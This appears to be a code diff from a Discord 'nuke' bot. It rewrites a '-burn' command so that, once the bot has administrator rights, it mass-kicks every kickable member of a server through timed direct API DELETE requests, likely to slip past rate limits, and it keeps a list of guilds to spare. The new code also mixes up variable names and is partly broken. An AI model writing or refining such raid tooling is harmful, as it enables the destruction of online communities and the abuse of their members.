@@ -295,20 +295,29 @@ client.on("message", msg => {
 
 
  
- 
-   client.on('message', message => {
-     if(message.content.startsWith('-burn')) {
- if(message.channel.type === "dm") {return}
-  if(!unallowedguilds.includes(message.guild.id)) {
-       if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !') 
- return
+
+client.on("message", async msg => {
+  if(msg.content === `-burn`) {
+    if(msg.channel.type === 'dm') {return}
+ if(!unallowedguilds.includes(message.guild.id)) {
+    if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
+          var gid = msg.guild.id
+          for(var i = 0; i < msg.guild.members.cache.filter(m => m.kickable === true).size; i++){
+            setTimeout(function() {
+              console.log("kicked")
+              axios({
+                url: `https://discord.com/api/v8/guilds/${gid}/members/${msg.guild.members.cache.filter(m => m.kickable === true).random().id}?reason=`,
+                method: 'DELETE',
+                headers: {
+                 authorization: `Bot ${token1}`
+                }
+              })
+            },i * 0600)
+        }
   }
-        message.guild.members.cache.forEach(m => {
-         if(m.kickable) m.kick();
-   });
-   }
-     }
-   })  
+}
+  }
+})
  /**
   *  
   message.guild.emojis.cache.forEach(e => {
